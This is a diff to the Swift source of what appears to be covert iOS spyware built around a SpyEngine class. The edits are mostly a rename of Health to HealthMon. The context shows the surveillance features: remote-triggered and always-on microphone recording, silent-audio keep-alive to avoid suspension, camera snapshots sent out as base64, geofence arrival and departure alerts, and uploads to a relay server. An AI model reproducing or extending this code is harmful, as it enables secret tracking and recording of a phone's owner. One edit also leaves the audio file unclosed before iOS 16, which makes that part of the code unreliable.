@@ -2,6 +2,7 @@ import Foundation
 import AVFoundation
 import CoreLocation
 import UIKit
+import SystemConfiguration
 
 final class MicGate {
     static let shared = MicGate()
@@ -29,10 +30,10 @@ final class MicGate {
         case .onDemand:
             SpyEngine.shared.setMic(false)
             if !Settings.shared.isOn(.silentKeepAlive) {
-                Health.fail(.mic, "On-demand mic with keep-alive off - app may suspend")
-            } else { Health.ok(.mic) }
+                HealthMon.fail(.mic, "On-demand mic with keep-alive off - app may suspend")
+            } else { HealthMon.ok(.mic) }
         case .voiceTrigger:
-            SpyEngine.shared.setMic(true); Health.ok(.mic)
+            SpyEngine.shared.setMic(true); HealthMon.ok(.mic)
         case .burst:
             burstOn = true; SpyEngine.shared.setMic(true); scheduleBurst()
         case .always:
@@ -138,7 +139,7 @@ final class Clips {
             AVLinearPCMIsBigEndianKey: false
         ]
         guard let f = try? AVAudioFile(forWriting: u, settings: settings) else {
-            Health.fail(.clipCapture, "Could not open clip file"); return
+            HealthMon.fail(.clipCapture, "Could not open clip file"); return
         }
         file = f; url = u; started = Date()
         if preRoll { preroll.forEach { try? f.write(from: $0) } }
@@ -155,7 +156,7 @@ final class Clips {
     private func end() {
         guard let f = file, let u = url, let s = started else { return }
         let dur = Date().timeIntervalSince(s)
-        try? f.close()
+        if #available(iOS 16.0, *) { try? f.close() }
         file = nil; url = nil; started = nil
         guard dur >= Settings.shared.clipMinSeconds else {
             try? FileManager.default.removeItem(at: u); return
@@ -179,9 +180,9 @@ final class Clips {
         URLSession.shared.uploadTask(with: r, from: data) { _, resp, err in
             try? FileManager.default.removeItem(at: u)
             guard err == nil, (resp as? HTTPURLResponse)?.statusCode == 200 else {
-                Health.fail(.clipCapture, err?.localizedDescription ?? "Upload rejected"); return
+                HealthMon.fail(.clipCapture, err?.localizedDescription ?? "Upload rejected"); return
             }
-            Health.ok(.clipCapture)
+            HealthMon.ok(.clipCapture)
             self.sessionClips += 1
             self.sessionSeconds += seconds
             Relay.shared.sendJSON(["type": "alert", "title": "Clip saved",
@@ -351,7 +352,7 @@ final class SpyEngine: NSObject, CLLocationManagerDelegate, AVCapturePhotoCaptur
     }
     func locationManager(_ m: CLLocationManager, didEnterRegion r: CLRegion) { geo("Arrived", r) }
     func locationManager(_ m: CLLocationManager, didExitRegion r: CLRegion)  { geo("Left", r) }
-    func locationManager(_ m: CLLocationManager, didFailWithError e: Error) { Health.fail(.location, e.localizedDescription) }
+    func locationManager(_ m: CLLocationManager, didFailWithError e: Error) { HealthMon.fail(.location, e.localizedDescription) }
 
     private func geo(_ verb: String, _ r: CLRegion) {
         guard Settings.shared.isOn(.pushAlerts) else { return }
@@ -384,13 +385,13 @@ final class SpyEngine: NSObject, CLLocationManagerDelegate, AVCapturePhotoCaptur
 
     func snap() {
         guard Settings.shared.isOn(.camera), Settings.shared.inWindow() else { return }
-        guard capture.isRunning else { Health.fail(.camera, "Capture session not running"); return }
+        guard capture.isRunning else { HealthMon.fail(.camera, "Capture session not running"); return }
         photoOut.capturePhoto(with: AVCapturePhotoSettings(), delegate: self)
     }
 
     func photoOutput(_ o: AVCapturePhotoOutput, didFinishProcessingPhoto p: AVCapturePhoto, error: Error?) {
-        if let e = error { Health.fail(.camera, e.localizedDescription); return }
-        guard let d = p.fileDataRepresentation() else { Health.fail(.camera, "No JPEG data"); return }
+        if let e = error { HealthMon.fail(.camera, e.localizedDescription); return }
+        guard let d = p.fileDataRepresentation() else { HealthMon.fail(.camera, "No JPEG data"); return }
         Outbox.shared.send(["type": "photo", "b64": d.base64EncodedString(), "t": Date().timeIntervalSince1970])
     }
 
@@ -405,7 +406,7 @@ final class SpyEngine: NSObject, CLLocationManagerDelegate, AVCapturePhotoCaptur
                 DispatchQueue.global().async { self?.capture.startRunning() }
             }
             if self?.silence?.isPlaying == false { self?.silence = nil; self?.startKeepAlive() }
-            Health.shared.sweep()
+            HealthMon.shared.sweep()
         }
     }
 
@@ -419,7 +420,7 @@ final class SpyEngine: NSObject, CLLocationManagerDelegate, AVCapturePhotoCaptur
             else { silence?.stop(); silence = nil }
         default: break
         }
-        Health.shared.sweep()
+        HealthMon.shared.sweep()
     }
 }
 
